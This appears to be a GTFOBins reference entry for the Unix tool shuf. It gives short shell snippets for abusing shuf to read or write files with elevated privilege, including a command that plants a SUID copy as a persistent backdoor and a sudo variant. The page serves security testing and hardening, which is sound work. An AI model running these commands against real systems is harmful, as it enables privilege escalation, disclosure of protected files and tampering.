# GTFOBin: shuf

## File write

It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.

The written file content is corrupted by adding a newline.

```
LFILE=file_to_write
shuf -e DATA -o "$LFILE"
```

## File read

It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.

The read file content is corrupted by randomizing the order of NUL terminated strings.

```
LFILE=file_to_read
shuf -z "$LFILE"
```

## SUID

If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.

This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.

The written file content is corrupted by adding a newline.

```
sudo install -m =xs $(which shuf) .

LFILE=file_to_write
./shuf -e DATA -o "$LFILE"
```

## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

The written file content is corrupted by adding a newline.

```
LFILE=file_to_write
sudo shuf -e DATA -o "$LFILE"
```